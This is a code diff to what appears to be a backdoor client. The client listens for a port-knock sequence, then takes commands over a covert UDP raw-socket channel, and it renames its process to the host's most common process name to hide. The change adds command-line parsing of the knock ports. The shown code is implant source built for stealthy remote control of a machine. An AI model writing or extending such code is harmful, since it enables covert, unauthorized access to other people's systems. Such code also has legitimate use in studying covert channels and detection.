@@ -67,10 +67,10 @@ class Client:
     2. After successful knock, accepts commands via UDP raw socket covert channel
     """
 
-    def __init__(self):
+    def __init__(self, knock_sequence=None):
         self.knock_ports = KNOCK_SEQUENCE
         self.command_port = COMMAND_PORT
-        self.knock_sequence = KNOCK_SEQUENCE
+        self.knock_sequence = knock_sequence or KNOCK_SEQUENCE
         self.knock_timeout = KNOCK_TIMEOUT
         self.knock_attempts = {}
         self.authorized_ips = set()
@@ -625,9 +625,18 @@ def main():
     name = most_common_process()
     if name:
         rename_process(name)
-    client = Client()
-    client.start()
+    # Parse optional knock sequence from cmdline args
+    if len(sys.argv) >= 4:
+        try:
+            knock_sequence = [int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])]
+        except ValueError:
+            print("[!] Knock ports must be integers")
+            sys.exit(1)
+    else:
+        knock_sequence = KNOCK_SEQUENCE  # default [7000, 8000, 9000]
 
+    client = Client(knock_sequence)
+    client.start()
 
 if __name__ == "__main__":
     main()
